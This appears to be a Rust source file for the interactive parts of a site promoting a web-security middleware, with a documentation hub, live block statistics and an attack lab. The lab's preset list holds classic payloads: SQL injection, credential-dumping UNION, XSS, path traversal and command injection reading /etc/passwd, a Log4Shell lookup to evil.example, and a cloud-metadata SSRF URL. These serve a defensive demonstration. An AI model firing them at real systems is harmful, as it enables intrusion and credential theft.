//! The interactive parts of the site. Each island renders on the server like any view and,
//! compiled to WebAssembly, hydrates in the browser from the same code: the server HTML
//! stays, only events and bindings are attached.
//!
//! Props travel in the HTML as plain strings: `lang|base|…` (see the `*_props` builders).

use std::rc::Rc;

use active::prelude::*;

use crate::docs::{CATEGORY_ORDER, category_icon};
use crate::i18n::{Lang, Texts};
use crate::icons::icon;
use crate::routes::doc_href;

/// Every island, registered under the name used by [`island`].
pub const ISLANDS: [(&str, active::IslandFn); 6] = [
    ("typewriter", typewriter),
    ("features", features),
    ("code-tabs", code_tabs),
    ("lab", lab),
    ("live-stats", live_stats),
    ("docs-hub", docs_hub),
];

/// Props split on `|`, with defaults for missing parts.
struct Props<'a>(Vec<&'a str>);

impl<'a> Props<'a> {
    fn new(props: &'a str) -> Self {
        Props(props.lines().next().unwrap_or("").split('|').collect())
    }

    fn get(&self, i: usize) -> &'a str {
        self.0.get(i).copied().unwrap_or("")
    }

    fn lang(&self) -> Lang {
        Lang::parse(self.get(0)).unwrap_or(Lang::En)
    }
}

/// `lang|base`: the props of most islands.
pub fn props(lang: Lang, base: &str) -> String {
    format!("{}|{base}", lang.code())
}

/// Props of the attack lab: `lang|base|compact|live` (`live` is `static` on GitHub Pages,
/// where there is no server to attack).
pub fn lab_props(lang: Lang, base: &str, compact: bool, live: bool) -> String {
    format!(
        "{}|{base}|{}|{}",
        lang.code(),
        if compact { "compact" } else { "full" },
        if live { "live" } else { "static" }
    )
}

/// Props of the live counters: `lang|base|live`.
pub fn stats_props(lang: Lang, base: &str, live: bool) -> String {
    format!(
        "{}|{base}|{}",
        lang.code(),
        if live { "live" } else { "static" }
    )
}

fn category_name(t: &'static Texts, id: &'static str) -> &'static str {
    t.categories
        .iter()
        .find(|c| c.id == id)
        .map_or(id, |c| c.name)
}

/// "Copy" button: the page motion copies `data-copy` and shows `data-done` for a moment.
pub fn copy_button(text: &str, t: &'static Texts, small: bool) -> Element {
    button()
        .class("copy-btn")
        .class(if small { "small" } else { "" })
        .attr("type", "button")
        .attr("aria-label", t.copy)
        .attr("title", t.copy)
        .attr("data-copy", text.to_string())
        .attr("data-done", t.copied)
        .child(icon("copy", 16).class("i-copy"))
        .child(icon("check", 16).class("i-check"))
        .child(span().text(t.copy))
}

// ---------------------------------------------------------------------------
// Typewriter
// ---------------------------------------------------------------------------

#[derive(Clone, Copy, PartialEq)]
struct Typing {
    word: usize,
    chars: usize,
    deleting: bool,
    pause: u8,
}

impl Typing {
    #[cfg_attr(not(target_arch = "wasm32"), allow(dead_code))]
    fn next(mut self, words: &[&str]) -> Typing {
        let len = words[self.word % words.len()].chars().count();
        if self.pause > 0 {
            self.pause -= 1;
        } else if !self.deleting {
            if self.chars < len {
                self.chars += 1;
            } else {
                self.deleting = true;
                self.pause = 28;
            }
        } else if self.chars > 0 {
            self.chars -= 1;
        } else {
            self.deleting = false;
            self.word = (self.word + 1) % words.len();
            self.pause = 4;
        }
        self
    }
}

/// Hero: types and deletes the attacks securite stops. The server writes the first word
/// in full (readable without JavaScript); the browser then deletes it and goes on.
pub fn typewriter(props: &str) -> Node {
    let words = Props::new(props).lang().t().hero_words;
    let state = use_state(Typing {
        word: 0,
        chars: words[0].chars().count(),
        deleting: true,
        pause: 28,
    });
    span()
        .class("typewriter")
        .on_mount(move |_| {
            #[cfg(target_arch = "wasm32")]
            if !crate::client::reduced_motion() {
                crate::client::every(65, move || state.update(|s| *s = s.next(words)));
            }
        })
        .child(span().class("gradient-text").text_dyn(move || {
            let s = state.get();
            words[s.word % words.len()].chars().take(s.chars).collect()
        }))
        .child(span().class("caret").attr("aria-hidden", "true"))
        .child(
            span()
                .class("sr-only")
                .text_dyn(move || words[state.get().word % words.len()].to_string()),
        )
        .into()
}

// ---------------------------------------------------------------------------
// Feature grid with category filter (home page)
// ---------------------------------------------------------------------------

/// Middleware cards, filtered by category.
pub fn features(props: &str) -> Node {
    let args = Props::new(props);
    let (lang, base) = (args.lang(), args.get(1));
    let t = lang.t();
    let filter = use_state(None::<&'static str>);
    let chips = div()
        .class("chips center reveal")
        .attr("role", "group")
        .child(
            button()
                .class("chip")
                .class_if("active", move || filter.get().is_none())
                .attr("type", "button")
                .on_click(move |_| filter.set(None))
                .text(t.all),
        )
        .children(
            t.categories
                .iter()
                .filter(|c| !matches!(c.id, "start" | "deploy" | "everyday"))
                .map(|c| {
                    let id = c.id;
                    button()
                        .class("chip")
                        .class_if("active", move || filter.get() == Some(id))
                        .attr("type", "button")
                        .on_click(move |_| filter.set(Some(id)))
                        .child(icon(category_icon(id), 15))
                        .text(c.name)
                }),
        );
    let grid = div()
        .class("feature-grid")
        .children(t.features.iter().enumerate().map(|(i, f)| {
            let category = f.category;
            a().href(doc_href(base, lang, f.slug))
                .class(format!("feature-card reveal d{}", i % 4))
                .bool_attr("hidden", move || {
                    filter.get().is_some_and(|c| c != category)
                })
                .child(
                    div()
                        .class("card-inner")
                        .child(span().class("card-glow").attr("aria-hidden", "true"))
                        .child(span().class("feature-icon").child(icon(f.icon, 22)))
                        .child(
                            span()
                                .class("feature-cat")
                                .text(category_name(t, f.category)),
                        )
                        .child(h3().text(f.name))
                        .child(p().text(f.desc))
                        .child(
                            span()
                                .class("feature-more")
                                .text(t.read_docs)
                                .child(icon("arrow-right", 14)),
                        ),
                )
        }));
    fragment([chips, grid])
}

// ---------------------------------------------------------------------------
// Code showcase with tabs (home page)
// ---------------------------------------------------------------------------

/// Highlighted snippet `i` (HTML, raw text). Only the server needs it: hydration keeps the
/// HTML the server wrote.
fn snippet(i: usize) -> (&'static str, &'static str) {
    #[cfg(not(target_arch = "wasm32"))]
    return crate::render::snippet(i);
    #[cfg(target_arch = "wasm32")]
    {
        let _ = i;
        ("", "")
    }
}

/// macOS-like code window with a copy button.
fn code_window(
    html: &'static str,
    raw: &'static str,
    title: &'static str,
    t: &'static Texts,
) -> Element {
    div()
        .class("code-window")
        .child(
            div()
                .class("code-head")
                .child(span().class("dots").child(i()).child(i()).child(i()))
                .child(span().class("code-lang").text(title))
                .child(copy_button(raw, t, true)),
        )
        .child(pre().child(code().html(html)))
}

/// "Easy" section: the text with its tabs, then one code window per tab.
pub fn code_tabs(props: &str) -> Node {
    let args = Props::new(props);
    let (lang, base) = (args.lang(), args.get(1));
    let t = lang.t();
    let tab = use_state(0usize);
    let titles = ["main.rs", "shield.rs", "layers.rs"];
    let copy = div()
        .class("code-copy reveal")
        .child(p().class("kicker").text(t.code_kicker))
        .child(h2().text(t.code_title))
        .child(p().class("muted").text(t.code_subtitle))
        .child(div().class("tabs").attr("role", "tablist").children(
            t.code_tabs.iter().enumerate().map(|(i, label)| {
                button()
                    .class("tab")
                    .class_if("active", move || tab.get() == i)
                    .attr("role", "tab")
                    .attr("type", "button")
                    .attr_dyn("aria-selected", move || (tab.get() == i).to_string())
                    .on_click(move |_| tab.set(i))
                    .text(*label)
            }),
        ))
        .child(
            a().class("btn btn-ghost")
                .href(doc_href(base, lang, "shield-presets"))
                .text(t.read_docs)
                .child(icon("arrow-right", 16)),
        );
    let stages = titles.into_iter().enumerate().map(|(i, title)| {
        let (html, raw) = snippet(i);
        Node::from(
            div()
                .class("code-stage fade-in")
                .attr("role", "tabpanel")
                .bool_attr("hidden", move || tab.get() != i)
                .child(code_window(html, raw, title, t)),
        )
    });
    fragment(std::iter::once(Node::from(copy)).chain(stages))
}

// ---------------------------------------------------------------------------
// Live attack lab
// ---------------------------------------------------------------------------

pub const PRESETS: &[(&str, &str)] = &[
    ("SQLi", "1' OR '1'='1"),
    ("UNION", "1 UNION SELECT username, password FROM users--"),
    ("XSS", "<script>alert(document.cookie)</script>"),
    ("XSS img", "<img src=x onerror=alert(1)>"),
    ("Traversal", "../../../../etc/passwd"),
    ("Log4Shell", "${jndi:ldap://evil.example/a}"),
    ("RCE", "127.0.0.1; cat /etc/passwd"),
    ("SSRF", "http://169.254.169.254/latest/meta-data/"),
    ("NoSQL", "{\"$where\": \"sleep(5000)\"}"),
    ("SSTI", "{{7*7}}"),
    ("Legit", "rust web security"),
];

/// The answer of `/api/demo`.
#[derive(Clone, PartialEq)]
pub enum Outcome {
    Idle,
    Loading,
    /// No server behind the site (static hosting) or the network is down.
    Offline,
    Done {
        status: u16,
        body: String,
        request_id: Option<String>,
        ms: f64,
    },
}

/// Minimal JSON pretty printer (no serde in the browser bundle).
pub fn pretty_json(s: &str) -> String {
    let mut out = String::new();
    let mut indent = 0usize;
    let mut in_str = false;
    let mut escape = false;
    for c in s.chars() {
        if in_str {
            out.push(c);
            if escape {
                escape = false;
            } else if c == '\\' {
                escape = true;
            } else if c == '"' {
                in_str = false;
            }
            continue;
        }
        match c {
            '"' => {
                in_str = true;
                out.push(c);
            }
            '{' | '[' => {
                indent += 1;
                out.push(c);
                out.push('\n');
                out.push_str(&"  ".repeat(indent));
            }
            '}' | ']' => {
                indent = indent.saturating_sub(1);
                out.push('\n');
                out.push_str(&"  ".repeat(indent));
                out.push(c);
            }
            ',' => {
                out.push(c);
                out.push('\n');
                out.push_str(&"  ".repeat(indent));
            }
            ':' => out.push_str(": "),
            c if c.is_whitespace() => {}
            c => out.push(c),
        }
    }
    out
}

fn verdict(outcome: Outcome, t: &'static Texts) -> Node {
    match outcome {
        Outcome::Idle => div().class("term-line muted").text(t.play_waiting).into(),
        Outcome::Loading => div()
            .class("term-line")
            .child(span().class("spinner"))
            .text(" GET /api/demo …")
            .into(),
        Outcome::Offline => div()
            .class("term-line warn-text")
            .text(t.play_offline)
            .into(),
        Outcome::Done {
            status,
            body,
            request_id,
            ms,
        } => {
            let blocked = status >= 400;
            div()
                .class("verdict")
                .class(if blocked { "blocked" } else { "allowed" })
                .child(
                    div()
                        .class("verdict-head")
                        .child(
                            span()
                                .class("verdict-badge")
                                .child(icon(if blocked { "shield" } else { "check" }, 18))
                                .text(if blocked {
                                    t.play_blocked
                                } else {
                                    t.play_allowed
                                }),
                        )
                        .child(
                            span()
                                .class("verdict-status")
                                .text(format!("HTTP {status}")),
                        )
                        .child(span().class("verdict-time").text(format!("{ms:.0} ms"))),
                )
                .child(request_id.map(|id| {
                    div()
                        .class("term-line muted small")
                        .text(format!("x-request-id: {id}"))
                }))
                .child(pre().class("verdict-body").text(body))
                .into()
        }
    }
}

/// The playground: sends payloads to `/api/demo` (protected by securite) and shows what
/// the shield answers. On GitHub Pages there is no server: it says so.
pub fn lab(props: &str) -> Node {
    let args = Props::new(props);
    let (lang, base) = (args.lang(), args.get(1).to_string());
    let compact = args.get(2) == "compact";
    let live = args.get(3) != "static";
    let t = lang.t();
    let payload = use_state(PRESETS[0].1.to_string());
    let outcome = use_state(Outcome::Idle);
    let history = use_state(Vec::<(String, u16)>::new());

    let fire: Rc<dyn Fn(String)> = Rc::new(move |text: String| {
        if !live {
            outcome.set(Outcome::Offline);
            return;
        }
        outcome.set(Outcome::Loading);
        #[cfg(target_arch = "wasm32")]
        {
            let url = format!(
                "{base}/api/demo?payload={}",
                crate::client::encode_uri_component(&text)
            );
            wasm_bindgen_futures::spawn_local(async move {
                let result = crate::client::net::demo(&url).await;
                if let Outcome::Done { status, .. } = &result {
                    let label: String = text.chars().take(42).collect();
                    let status = *status;
                    history.update(|h| {
                        h.insert(0, (label, status));
                        h.truncate(6);
                    });
                }
                outcome.set(result);
            });
        }
        #[cfg(not(target_arch = "wasm32"))]
        let _ = (&base, text, history);
    });

    let notice = (!live).then(|| {
        p().class("callout warn small lab-static")
            .text(t.play_static)
            .text(" ")
            .child(
                a().href(doc_href(args.get(1), lang, "heroku-from-phone"))
                    .text(t.deploy_guide),
            )
    });

    let submit = fire.clone();
    let form = form()
        .class("lab-form")
        .on("submit", move |e| {
            e.prevent_default();
            submit(payload.get());
        })
        .child(
            label()
                .class("lab-label")
                .attr("for", "payload")
                .text(t.play_payload),
        )
        .child(
            div()
                .class("lab-input")
                .child(span().class("prompt").text("?payload="))
                .child(
                    input()
                        .id("payload")
                        .attr("type", "text")
                        .attr_dyn("value", move || payload.get())
                        .attr("spellcheck", "false")
                        .attr("autocomplete", "off")
                        .on_input(move |e| payload.set(e.value())),
                )
                .child(
                    button()
                        .class("btn btn-primary")
                        .attr("type", "submit")
                        .child(icon("play", 16))
                        .text(t.play_send),
                ),
        );

    let presets = div()
        .class("lab-presets")
        .child(span().class("lab-label").text(t.play_presets))
        .child(
            div()
                .class("chips")
                .children(PRESETS.iter().map(|(label, text)| {
                    let fire = fire.clone();
                    button()
                        .class("chip")
                        .class(if *label == "Legit" { "chip-ok" } else { "" })
                        .attr("type", "button")
                        .on_click(move |_| {
                            payload.set(text.to_string());
                            fire(text.to_string());
                        })
                        .text(*label)
                })),
        );

    let terminal = div()
        .class("terminal")
        .child(
            div()
                .class("code-head")
                .child(span().class("dots").child(i()).child(i()).child(i()))
                .child(span().class("code-lang").text("securite · shield")),
        )
        .child(
            div()
                .class("terminal-body")
                .attr("aria-live", "polite")
                .children_dyn(move || vec![verdict(outcome.get(), t)])
                .children_dyn(move || {
                    let items = history.get();
                    if items.is_empty() {
                        return Vec::new();
                    }
                    vec![
                        ul().class("history")
                            .children(items.into_iter().map(|(label, status)| {
                                li().child(span().class("status-dot").class(if status >= 400 {
                                    "bad"
                                } else {
                                    "ok"
                                }))
                                .child(code().text(label))
                                .child(span().class("muted").text(status.to_string()))
                            }))
                            .into(),
                    ]
                }),
        );

    div()
        .class("lab")
        .class(if compact { "compact" } else { "" })
        .child(notice)
        .child(form)
        .child(presets)
        .child(terminal)
        .into()
}

// ---------------------------------------------------------------------------
// Live shield statistics
// ---------------------------------------------------------------------------

#[derive(Clone, Copy, PartialEq, Default, Debug)]
pub struct Stats {
    pub total: u64,
    pub allowed: u64,
    pub blocked: u64,
}

/// Reads `{"total":…,"allowed":…,"blocked":…}` from `/api/stats`.
pub fn parse_stats(s: &str) -> Option<Stats> {
    let get = |key: &str| -> Option<u64> {
        let pat = format!("\"{key}\":");
        let start = s.find(&pat)? + pat.len();
        let digits: String = s[start..]
            .chars()
            .skip_while(|c| c.is_whitespace())
            .take_while(char::is_ascii_digit)
            .collect();
        digits.parse().ok()
    };
    Some(Stats {
        total: get("total")?,
        allowed: get("allowed")?,
        blocked: get("blocked")?,
    })
}

/// Counters of the shield protecting this site, from `/api/stats`, refreshed every 4 s.
/// Hidden until the first answer, and on static hosting.
pub fn live_stats(props: &str) -> Node {
    let args = Props::new(props);
    let (lang, base) = (args.lang(), args.get(1).to_string());
    let live = args.get(2) == "live";
    let t = lang.t();
    let stats = use_state(None::<Stats>);
    let value = move |f: fn(Stats) -> u64| move || stats.get().map_or(0, f).to_string();
    let width = move |f: fn(Stats) -> u64| {
        move || {
            let s = stats.get().unwrap_or_default();
            let pct = if s.total == 0 {
                0.0
            } else {
                f(s) as f64 * 100.0 / s.total as f64
            };
            format!("width:{pct:.1}%")
        }
    };
    div()
        .class("live-stats")
        .bool_attr("hidden", move || stats.get().is_none())
        .on_mount(move |_| {
            #[cfg(target_arch = "wasm32")]
            if live {
                crate::client::net::poll_stats(&base, stats);
            }
            #[cfg(not(target_arch = "wasm32"))]
            let _ = (live, &base);
        })
        .child(
            div()
                .class("live-head")
                .child(span().class("pulse"))
                .text(t.play_stats),
        )
        .child(
            div()
                .class("live-grid")
                .child(
                    div()
                        .child(strong().text_dyn(value(|s| s.total)))
                        .child(span().text(t.play_total)),
                )
                .child(
                    div()
                        .class("ok")
                        .child(strong().text_dyn(value(|s| s.allowed)))
                        .child(span().text(t.play_passed)),
                )
                .child(
                    div()
                        .class("bad")
                        .child(strong().text_dyn(value(|s| s.blocked)))
                        .child(span().text(t.play_stopped)),
                ),
        )
        .child(
            div()
                .class("live-bar")
                .child(span().class("ok").attr_dyn("style", width(|s| s.allowed)))
                .child(span().class("bad").attr_dyn("style", width(|s| s.blocked))),
        )
        .into()
}

// ---------------------------------------------------------------------------
// Documentation hub: search and category filter
// ---------------------------------------------------------------------------

/// One card of the documentation hub.
#[derive(Clone, PartialEq)]
struct Entry {
    slug: String,
    category: String,
    title: String,
    summary: String,
    search: Rc<str>,
}

/// Props of the documentation hub: `lang|base`, then one line per page:
/// `slug \t category \t title \t summary \t search words`.
pub fn docs_hub_props<'a>(
    lang: Lang,
    base: &str,
    pages: impl IntoIterator<Item = [&'a str; 5]>,
) -> String {
    let mut out = props(lang, base);
    for fields in pages {
        out.push('\n');
        let clean: Vec<String> = fields
            .iter()
            .map(|f| f.replace(['\t', '\n', '\r'], " "))
            .collect();
        out.push_str(&clean.join("\t"));
    }
    out
}

fn entries(props: &str) -> Vec<Entry> {
    props
        .lines()
        .skip(1)
        .filter_map(|line| {
            let mut f = line.split('\t');
            Some(Entry {
                slug: f.next()?.to_string(),
                category: f.next()?.to_string(),
                title: f.next()?.to_string(),
                summary: f.next()?.to_string(),
                search: Rc::from(f.next().unwrap_or("")),
            })
        })
        .collect()
}

fn matches(
    query: &str,
    category: Option<&str>,
    entry_category: &str,
    slug: &str,
    search: &str,
) -> bool {
    if category.is_some_and(|c| c != entry_category) {
        return false;
    }
    let q = query.trim().to_lowercase();
    q.split_whitespace()
        .all(|w| search.contains(w) || slug.contains(w))
}

/// The documentation hub: title, search box, category chips and the cards of every page.
pub fn docs_hub(props: &str) -> Node {
    let args = Props::new(props);
    let (lang, base) = (args.lang(), args.get(1));
    let t = lang.t();
    let all = Rc::new(entries(props));
    let query = use_state(String::new());
    let category = use_state(None::<&'static str>);

    let visible = {
        let all = all.clone();
        move |cat: &'static str| {
            let (q, sel) = (query.get(), category.get());
            all.iter()
                .filter(|e| e.category == cat && matches(&q, sel, &e.category, &e.slug, &e.search))
                .count()
        }
    };
    let some = {
        let all = all.clone();
        move || {
            let (q, sel) = (query.get(), category.get());
            all.iter()
                .any(|e| matches(&q, sel, &e.category, &e.slug, &e.search))
        }
    };

    let hero = section()
        .class("page-hero container")
        .child(div().class("blob b1").attr("aria-hidden", "true"))
        .child(p().class("kicker").text(t.docs_kicker))
        .child(h1().text(t.docs_title))
        .child(p().class("muted lead").text(t.docs_subtitle))
        .child(
            label().class("search").child(icon("search", 18)).child(
                input()
                    .attr("type", "search")
                    .attr("placeholder", t.docs_search)
                    .attr("aria-label", t.docs_search)
                    .on_input(move |e| query.set(e.value())),
            ),
        )
        .child(
            div()
                .class("chips center")
                .child(
                    button()
                        .class("chip")
                        .class_if("active", move || category.get().is_none())
                        .attr("type", "button")
                        .on_click(move |_| category.set(None))
                        .text(t.all),
                )
                .children(CATEGORY_ORDER.iter().map(|id| {
                    let id: &'static str = id;
                    button()
                        .class("chip")
                        .class_if("active", move || category.get() == Some(id))
                        .attr("type", "button")
                        .on_click(move |_| category.set(Some(id)))
                        .child(icon(category_icon(id), 15))
                        .text(category_name(t, id))
                })),
        );

    let sections = CATEGORY_ORDER.iter().map(|cat| {
        let cat: &'static str = cat;
        let info = t.categories.iter().find(|c| c.id == cat);
        let count = visible.clone();
        let shown = visible.clone();
        let cards = all
            .iter()
            .filter(|e| e.category == cat)
            .enumerate()
            .map(|(i, e)| {
                let entry = e.clone();
                a().href(doc_href(base, lang, &e.slug))
                    .class(format!("doc-card reveal d{}", i % 4))
                    .bool_attr("hidden", move || {
                        !matches(
                            &query.get(),
                            category.get(),
                            &entry.category,
                            &entry.slug,
                            &entry.search,
                        )
                    })
                    .child(
                        div()
                            .class("card-inner")
                            .child(span().class("card-glow").attr("aria-hidden", "true"))
                            .child(h3().text(e.title.clone()))
                            .child(p().text(e.summary.clone()))
                            .child(
                                span()
                                    .class("feature-more")
                                    .text(t.read_docs)
                                    .child(icon("arrow-right", 14)),
                            ),
                    )
            });
        section()
            .class("doc-cat")
            .bool_attr("hidden", move || shown(cat) == 0)
            .child(
                div()
                    .class("doc-cat-head reveal")
                    .child(
                        span()
                            .class("feature-icon")
                            .child(icon(category_icon(cat), 22)),
                    )
                    .child(
                        div()
                            .child(h2().text(info.map_or(cat, |c| c.name)))
                            .child(p().class("muted").text(info.map_or("", |c| c.desc))),
                    )
                    .child(
                        span()
                            .class("count")
                            .text_dyn(move || format!("{} {}", count(cat), t.docs_pages)),
                    ),
            )
            .child(div().class("doc-grid").children(cards))
    });

    div()
        .class("docs-hub")
        .child(hero)
        .child(
            div().class("container").children(sections).child(
                p().class("empty muted")
                    .bool_attr("hidden", some)
                    .text(t.docs_none),
            ),
        )
        .into()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_island_renders_on_the_server() {
        for (name, island_fn) in ISLANDS {
            let html = active::island(name, "fr|/Securite", island_fn).render();
            assert!(
                html.starts_with(&format!(
                    r#"<active-island data-island="{name}" data-props="fr|/Securite">"#
                )),
                "{name}: {html}"
            );
        }
    }

    #[test]
    fn the_lab_says_when_there_is_no_server() {
        let live = active::island("lab", lab_props(Lang::En, "", false, true), lab).render();
        assert!(!live.contains("lab-static"));
        assert!(live.contains("Waiting for a request"), "{live}");
        let html =
            active::island("lab", lab_props(Lang::En, "/Securite", true, false), lab).render();
        assert!(html.contains("lab-static"));
        assert!(html.contains("href=\"/Securite/en/docs/heroku-from-phone/\""));
        assert!(html.contains(r#"class="lab compact""#));
    }

    #[test]
    fn the_docs_hub_lists_its_pages() {
        let props = docs_hub_props(
            Lang::Fr,
            "/Securite",
            [
                ["waf", "threats", "WAF", "Pare-feu", "waf sqli xss"],
                ["csrf", "access", "CSRF", "Jetons", "csrf fetch metadata"],
            ],
        );
        let html = active::island("docs-hub", props, docs_hub).render();
        assert!(html.contains("href=\"/Securite/fr/docs/waf/\""));
        assert!(html.contains("<h3>CSRF</h3>"));
        assert!(html.contains("1 pages"), "{html}");
        // The category without pages is hidden, the "no result" message too.
        assert!(html.contains(r#"<section class="doc-cat" hidden="">"#));
        assert!(html.contains(r#"<p class="empty muted" hidden="">"#));
    }

    #[test]
    fn search_matches_every_word() {
        assert!(matches("", None, "waf", "waf", "x"));
        assert!(matches("SQLi  waf", None, "threats", "waf", "waf sqli xss"));
        assert!(!matches(
            "sqli csrf",
            None,
            "threats",
            "waf",
            "waf sqli xss"
        ));
        assert!(!matches("", Some("access"), "threats", "waf", ""));
    }

    #[test]
    fn stats_and_json_helpers() {
        assert_eq!(
            parse_stats(r#"{"total":5,"allowed":3,"blocked":2,"by_guard":{}}"#),
            Some(Stats {
                total: 5,
                allowed: 3,
                blocked: 2
            })
        );
        assert_eq!(parse_stats("<html>"), None);
        assert_eq!(
            pretty_json(r#"{"a":1,"b":"x, y"}"#),
            "{\n  \"a\": 1,\n  \"b\": \"x, y\"\n}"
        );
    }

    #[test]
    fn the_typewriter_types_then_deletes() {
        let words = ["ab", "c"];
        let mut s = Typing {
            word: 0,
            chars: 2,
            deleting: true,
            pause: 0,
        };
        s = s.next(&words).next(&words).next(&words);
        assert_eq!((s.word, s.chars, s.deleting), (1, 0, false));
    }
}
